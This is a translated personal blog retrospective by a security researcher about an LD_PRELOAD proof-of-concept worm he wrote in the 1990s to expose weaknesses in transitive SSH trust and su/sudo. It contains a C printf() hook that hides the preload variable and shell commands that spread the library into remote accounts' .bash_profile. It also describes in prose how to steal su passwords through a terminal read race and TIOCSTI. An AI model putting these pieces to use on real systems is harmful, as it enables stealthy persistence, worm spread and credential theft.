<!--yml

分类：未分类

日期：2024-05-27 13:37:28

-->

# 那个时候我制作了一个LD_PRELOAD蠕虫 - lcamtuf 的东西

> 来源：[https://lcamtuf.substack.com/p/that-time-i-built-an-ld_preload-worm](https://lcamtuf.substack.com/p/that-time-i-built-an-ld_preload-worm)

在信息安全领域工作最有趣的一部分之一是开发概念验证代码的任务。本质上，你经常会发现自己编写恶意程序，以证明一个假设的漏洞是真实存在的，并且说服同事、客户或第三方软件供应商他们需要采取行动。

保护系统和帮助坏人之间的界线可能非常模糊；只需加上几个修饰，概念验证漏洞利用就能变成一个可以真正造成伤害的工具。在一个著名的案例中——1988年的[Morris蠕虫](https://en.wikipedia.org/wiki/Morris_worm)——研究人员自己无法抵挡诱惑。在大多数其他情况下，这项工作由那些获得研究成果但不那么谨慎的人完成，因此引发了关于漏洞披露伦理的无休止辩论。

嗯——昨天，当我翻阅我20世纪90年代末及其附近文件的备份时，我意外地重新发现了我自己制作的迄今为止最冒险的概念验证：一个名为*unicorns.so*的私密共享的LD_PRELOAD蠕虫演示，显然是为了解决关于分布式信任的争论。

如果你对`LD_PRELOAD`不熟悉，它是Unix-like系统上一个非常好的调试机制。几乎所有常见程序都是动态链接的；换句话说，它们不会携带自己的函数副本，例如`fopen()`，而是从一个系统范围的共享库中引入。`LD_PRELOAD`变量用于指示链接器（负责查找和加载这些共享代码的小型程序）首先检查您选择的位置。实际上，这使您可以为任何库调用提供一个替代品。

*unicorns.so*库有三个主要组件。第一个且最不起眼的部分仅仅是从受影响的进程中隐藏了自己的存在。例如，为了在`set`命令的输出中隐藏`LD_PRELOAD`变量，它篡改了`printf()`函数：

> ```
> int printf(char* format, ...) {
>   int r;
>   char* o;
>   va_list p;
> 
>   va_start(p, format); o = va_arg(p, char*); va_end(p);
> 
>   if (unicorn_printf_ignore > 0) { unicorn_printf_ignore--; return 0; }
> 
>   if ((!strcmp(format, "%s=")) && (!strcmp(o, "LD_PRELOAD"))) {
>     debug("Unicorns: Trying to hide LD_PRELOAD list attempt (set).\n");
>     unicorn_printf_ignore = 2;
>     return 0;
>   }
> 
>   va_start(p, format); r = vprintf(format, p); va_end(p);
>   return r;
> 
> }
> ```

该库的第二个组件与**Tatu Ylönen**的SSH程序以及其当时初步替代品**OpenSSH**发生冲突。当它检测到与远程服务器的成功连接时，它会注入一对隐藏命令。这些命令通过在远程帐户的 shell 初始化文件中添加一个`LD_PRELOAD`行，将该库传播到目标系统上：

> ```
> test -s .addressbook.lu~ && exit 1
> cat >.addressbook.lu~
> QQ=`LD_PRELOAD=$PWD/.addressbook.lu~ ls /etc/passwd`
> test "$QQ" = "" && rm -f .addressbook.lu~
> test "$QQ" = "" && exit 1
> echo -e '\nexport LD_PRELOAD='$PWD/.addressbook.lu~ exec bash >>.bash_profile
> exit 0
> ```

实际上，*unicorns.so*是一个计算机蠕虫；它通过利用传递性信任从一个系统跳到另一个系统。你只需这样一次引导它：

> ```
> LD_PRELOAD=$PWD/unicorns.so bash
> ssh user@somehost
> ```

这个库的最终组件负责检测和拦截*su*或*sudo*的执行。这两个程序是Unix-like系统中提升权限最常见的方式，错误地被认为比直接登录管理员账户更安全。为了扩散到其他服务器，蠕虫需要感染受影响机器上的所有用户账户 — 因此需要按照这个路径操作。

这两个二进制文件本身是*setuid* — 即它们具有一个特殊的文件系统标志，提示操作系统使用提升的特权来执行它们，并指示链接器忽略LD_PRELOAD。尽管如此，这种安全边界是虚幻的。你无需篡改这些程序本身；篡改它们的输入输出就足够了。

这样做最优雅的方法可能是通过*/dev/ptmx*分配一个新的伪终端，然后在那个新的终端上运行*su*，并充当一个中间人 — 在呈现给用户一个经过清理的视图的同时注入恶意命令。一个更简单的选项是利用一个巧妙的竞争条件：当两个程序在同一个终端上执行阻塞的*read()*时，一个胜出，另一个失败 — 当*su*显示密码提示时，我们可以确保胜者是恶意库。被捕获的密码可以通过使用[TIOCSTI](https://man7.org/linux/man-pages/man2/ioctl_tty.2.html)调用无缝地重新注入。

我编写这段代码的动机是为了展示分布式信任的脆弱性，并抨击使用*su*和*sudo*而不是直接以root身份登录的范式。尽管如此，我自己也遭受了打击：公开讨论实现似乎太冒险，所以代码最终被搁置一旁 — 而关于这些安全问题的零星讨论继续了大约二十年。现在，共享使用的Unix系统时代大多已经过去，这些问题的紧迫性也不如从前。

*要查看博客上之前帖子的主题目录，请点击[这里](https://lcamtuf.coredump.cx/offsite.shtml)。*
